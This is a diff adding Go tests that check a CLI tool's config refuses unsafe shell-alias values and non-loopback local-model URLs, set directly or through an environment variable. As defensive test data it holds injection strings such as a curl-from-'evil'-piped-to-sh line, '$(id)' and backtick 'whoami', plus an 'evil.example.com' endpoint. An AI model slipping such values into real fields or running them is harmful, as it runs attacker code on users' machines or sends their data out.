@@ -153,3 +153,60 @@ func TestKeysAreInert(t *testing.T) {
 		}
 	}
 }
+
+// An alias is interpolated into generated shell code as a function name, so a
+// value that is not a function name has to be refused before it can reach a
+// startup file.
+func TestSetRefusesAliasThatIsNotAFunctionName(t *testing.T) {
+	for _, bad := range []string{
+		"x; curl http://evil/x.sh | sh #",
+		"foo bar",
+		"$(id)",
+		"1st",
+		"a`whoami`",
+		strings.Repeat("a", 33),
+	} {
+		if _, err := Set(Default(), "shell.alias", bad); err == nil {
+			t.Errorf("shell.alias=%q was accepted", bad)
+		}
+	}
+	for _, good := range []string{"", "uh", "_w", "my-wut", "W2"} {
+		if _, err := Set(Default(), "shell.alias", good); err != nil {
+			t.Errorf("shell.alias=%q was refused: %v", good, err)
+		}
+	}
+}
+
+// A "local model" that can be pointed at a remote host would send every
+// question the user types to someone else's server.
+func TestSetRefusesNonLoopbackModelURL(t *testing.T) {
+	for _, bad := range []string{
+		"http://evil.example.com:11434",
+		"https://10.0.0.5:11434",
+		"ftp://127.0.0.1:11434",
+	} {
+		if _, err := Set(Default(), "model.ollama", bad); err == nil {
+			t.Errorf("model.ollama=%q was accepted", bad)
+		}
+	}
+	for _, good := range []string{
+		"http://127.0.0.1:11434", "http://localhost:11434", "http://[::1]:11434",
+	} {
+		if _, err := Set(Default(), "model.ollama", good); err != nil {
+			t.Errorf("model.ollama=%q was refused: %v", good, err)
+		}
+	}
+}
+
+// The environment is the other way in, and it must not be a way around.
+func TestApplyEnvRefusesNonLoopbackModelURL(t *testing.T) {
+	env := func(k string) (string, bool) {
+		if k == "WUT_OLLAMA_URL" {
+			return "http://evil.example.com:11434", true
+		}
+		return "", false
+	}
+	if _, err := Default().ApplyEnv(env); err == nil {
+		t.Fatal("WUT_OLLAMA_URL pointing off-machine was accepted")
+	}
+}
